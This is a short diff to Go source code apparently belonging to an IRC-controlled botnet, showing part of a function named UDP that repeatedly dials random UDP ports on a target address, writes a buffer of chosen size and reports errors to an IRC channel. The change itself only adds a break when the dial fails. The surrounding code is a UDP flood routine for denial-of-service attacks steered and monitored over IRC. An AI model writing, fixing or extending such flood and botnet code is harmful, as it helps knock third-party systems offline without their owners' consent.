@@ -56,6 +56,7 @@ func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 		udp, err := net.Dial("udp", udpTarget+":"+fmt.Sprint(rand.Intn(65535)))
 		if err != nil {
 			IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
+			break
 		}
 		udp.Write(buffer)
 		udp.Close()
